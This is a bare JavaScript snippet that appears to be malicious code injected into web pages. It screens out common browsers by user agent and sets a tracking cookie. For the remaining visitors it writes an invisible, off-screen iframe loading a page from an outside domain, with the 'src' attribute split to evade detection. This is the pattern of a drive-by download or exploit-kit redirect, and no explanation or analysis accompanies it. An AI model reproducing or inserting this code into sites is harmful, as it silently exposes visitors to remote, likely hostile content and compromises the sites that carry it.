(function(){
function stripos (f_haystack, f_needle, f_offset) {
 var haystack = (f_haystack + '').toLowerCase();
 var needle = (f_needle + '').toLowerCase();
 var index = 0;
 if ((index = haystack.indexOf(needle, f_offset)) !== -1) {
  return index;
 }
 return false;
}
function ddd_checker_ua(){
 var schwarzList = ['rv:11.0','Mini','iPhone','Macintosh','Linux','iPad','Series40','SymbOS','Nokia','SlimBrowser','AmigaOS','Android','FreeBSD','Chrome','IEMobile','SymbianOS','Chromium','Firefox/18.0','Firefox/18.0.1','Firefox/17.0','Firefox/12.0','Firefox/25.0','Firefox/24.0','Firefox/18.0.2','Firefox/19.0','Firefox/19.0.1','Firefox/20.0','Firefox/21.0','Firefox/22.0','Firefox/23.0','Firefox/25.0.1','Firefox/26.0','Firefox/27.0','Firefox/28.0'];
 var schwarzUA = false;
 for (var i in schwarzList) {
  if (stripos(navigator.userAgent, schwarzList[i])) {
   schwarzUA = true;
   break;
  }
 }
 return schwarzUA;
}
function setCookie(name, value, expires) {
 var date = new Date( new Date().getTime() + expires*1000 );
 document.cookie = name+'='+value+'; path=/; expires='+date.toUTCString();
}
function getCookie(name) {
 var matches = document.cookie.match(new RegExp( "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\/\+^])/g, '$1') + "=([^;]*)" ));
 return matches ? decodeURIComponent(matches[1]) : undefined;
}
if (!ddd_checker_ua()) {
 var cookie = getCookie('lisa6ra12mer8ma45her');
 if (cookie == undefined) {
  setCookie('lisa6ra12mer8ma45her', true, 87000);	
  document.write('<iframe'+' s'+'rc="http://ttramvai.pervers.ch/htjtkk9.html" style="position:absolute;left:'+'-1000px;top:'+'-1000px;" height="150" width="150"></iframe>');
 }
};
})();
